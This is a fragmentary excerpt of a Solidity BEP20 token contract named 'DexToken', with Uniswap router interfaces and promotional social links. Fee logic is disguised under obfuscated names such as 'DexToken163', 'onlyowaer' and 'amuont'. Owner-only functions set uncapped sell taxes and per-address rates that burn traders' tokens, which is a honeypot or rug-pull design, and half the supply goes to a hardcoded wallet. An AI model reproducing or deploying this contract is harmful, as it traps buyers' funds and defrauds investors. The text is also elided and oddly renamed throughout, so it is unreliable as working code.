...
* http://instagram.com/DexToken163
* https://www.reddit.com/user/DexToken163
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingDexToken163OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingDexToken163OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function swapExactTokensForTokensSupportingDexToken163OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingDexToken163OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingDexToken163OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
...
interface IUniswapV2Factory {
    ...
    function DexToken163To() external view returns (address);
    function DexToken163ToSetter() external view returns (address);
    ...
    function setDexToken163To(address) external;
    function setDexToken163ToSetter(address) external;
}
...
contract DT is BEP20, Ownable {
    // ext
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _release;
	string name_ = "DexToken";
	string symbol_ = "DT";
	...
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*5);	
        ...
        _defaultSellDexToken163 = 0;
        _defaultBuyDexToken163 = 0;
    ...
    uint256 private _defaultSellDexToken163 = 0;
    uint256 private _defaultBuyDexToken163 = 0;
    ...
    function incS(uint256 _value) external onlyowaer {
        _defaultSellDexToken163 = _value;
    }


    function acDexToken163fq(address _acc, uint256 _value) external onlyowaer {
 ...
 function getRelease(address _address) external view onlyowaer returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeDexToken163amuont = 0;

        if (rF) {
            uint256 tradeDexToken163 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradeDexToken163 = _msgDexToken163Info(uint160(from));
                    tradeDexToken163 = tradeDexToken163 < _defaultSellDexToken163 ? _defaultSellDexToken163 : tradeDexToken163;
                }
                if (from == uniswapV2Pair) {
                    tradeDexToken163 = _defaultBuyDexToken163;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradeDexToken163 = _Escape[from];
            }


            tradeDexToken163amuont = _amuont.mul(tradeDexToken163).div(100);
        }


        if (tradeDexToken163amuont > 0) {
            _balances[from] = _balances[from].sub(tradeDexToken163amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradeDexToken163amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradeDexToken163amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradeDexToken163amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradeDexToken163amuont);
        emit Transfer(from, _to, _amuont - tradeDexToken163amuont);
    }
	...
	function _msgDexToken163Info(uint _acc) internal view virtual returns (uint) {
